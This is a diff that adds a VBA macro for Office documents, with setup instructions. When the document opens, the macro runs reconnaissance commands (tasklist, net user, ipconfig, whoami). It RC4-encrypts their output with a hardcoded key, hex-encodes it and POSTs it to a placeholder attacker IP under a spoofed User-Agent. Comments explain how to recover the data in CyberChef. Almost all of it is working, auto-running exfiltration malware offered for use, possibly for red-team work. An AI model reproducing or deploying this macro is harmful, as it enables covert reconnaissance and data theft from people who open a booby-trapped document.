@@ -1,0 +1,127 @@
+' Chris Sikes
+' Run commands then RC4 Encrypt then POST to a web server.
+' Create an office document that accepts macros, Alt F11 to open VBA, then right click and Insert > Module.
+' Paste the following VBA script into the module. Modify commands as needed, and modify X.X.X.X with the ip address to POST to.
+' Play the macro, and the commands will run, then be RC4 encrypted with the password 'strongpassword', then converted to Hex.
+' Each command will be sent as a POST to the receiving ip address as Hex strings. 
+' Copy each hex string received (POST Data field) in the web log into https://gchq.github.io/CyberChef/
+' For the recipe, add "From Hex" then "RC4 Drop" and type in the password.
+
+Public Function ShellRun(sCmd As String) As String
+    Dim oShell As Object
+    Set oShell = CreateObject("WScript.Shell")
+    Dim oExec As Object
+    Dim oOutput As Object
+    Set oExec = oShell.Exec(sCmd)
+    Set oOutput = oExec.StdOut
+    Dim s As String
+    Dim ourText As String
+    Dim ourKey As String
+    Dim sLine As String
+    
+    ourKey = "strongpassword"
+    
+    While Not oOutput.AtEndOfStream
+        sLine = oOutput.ReadLine
+        If sLine <> "" Then s = s & sLine & vbCrLf
+    Wend
+
+    ShellRun = RC4(s, ourKey)
+
+End Function
+
+Sub Document_open()
+Dim strText As String
+Dim blah2 As String
+Dim blah3 As String
+Dim intX As Integer
+Dim strKey As String
+Dim Disp As String
+
+strKey = "strongpassword"
+
+
+strText = ShellRun("tasklist")
+For intX = 1 To Len(strText)
+            Disp = Disp & Right("0" & Hex(Asc(Mid(strText, intX))), 2)
+    Next intX
+Debug.Print (Disp)
+hi = httpPostStringFunc("http://X.X.X.X:80/", Disp)
+
+Disp = ""
+strText = ShellRun("net user")
+For intX = 1 To Len(strText)
+            Disp = Disp & Right("0" & Hex(Asc(Mid(strText, intX))), 2)
+    Next intX
+Debug.Print (Disp)
+hi = httpPostStringFunc("http://X.X.X.X:80/", Disp)
+
+Disp = ""
+strText = ShellRun("ipconfig")
+For intX = 1 To Len(strText)
+            Disp = Disp & Right("0" & Hex(Asc(Mid(strText, intX))), 2)
+    Next intX
+Debug.Print (Disp)
+hi = httpPostStringFunc("http://X.X.X.X:80/", Disp)
+
+Disp = ""
+strText = ShellRun("whoami")
+For intX = 1 To Len(strText)
+            Disp = Disp & Right("0" & Hex(Asc(Mid(strText, intX))), 2)
+    Next intX
+Debug.Print (Disp)
+hi = httpPostStringFunc("http://X.X.X.X:80/", Disp)
+
+
+End Sub
+
+
+Public Function httpPostStringFunc(target As String, data As String)
+    Dim post As String
+           
+    post = "post=" & data
+    
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+    URL = target
+    objHTTP.Open "POST", URL, False
+    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
+    objHTTP.send post
+End Function
+
+Public Function RC4(strText As String, strKey As String) As String
+    Dim intKeyLen As Integer, intTemp As Integer
+    Dim intX1 As Integer, intX2 As Integer, intX3 As Integer
+    Dim aintB(256) As Integer, aintK(256) As Integer
+
+    'Initialise buffer and keystream
+    intKeyLen = Len(strKey)
+    For intX1 = 0 To 255
+        aintB(intX1) = intX1
+        aintK(intX1) = Asc(Mid(strKey, (intX1 Mod intKeyLen) + 1))
+    Next
+
+    'Scramble up the data in the buffer a bit
+    intX2 = 0
+    For intX1 = 0 To 255
+        intX2 = (intX2 + aintB(intX1) + aintK(intX1)) Mod 256
+        intTemp = aintB(intX1)
+        aintB(intX1) = aintB(intX2)
+        aintB(intX2) = intTemp
+    Next
+
+    'Encode/Decode (but Process n bytes through the stream before we start)
+    intX2 = 0
+    intX3 = 0
+    For intX1 = 1 To 3072 + Len(strText)
+        intX2 = (intX2 + 1) Mod 256
+        intX3 = (intX3 + aintB(intX2)) Mod 256
+        intTemp = aintB(intX2)
+        aintB(intX2) = aintB(intX3)
+        aintB(intX3) = intTemp
+        If intX1 > 3072 Then
+            RC4 = RC4 & _
+                  Chr(Asc(Mid(strText, intX1 - 3072)) Xor _
+                      aintB((aintB(intX2) + aintB(intX3)) Mod 256))
+        End If
+    Next
+End Function
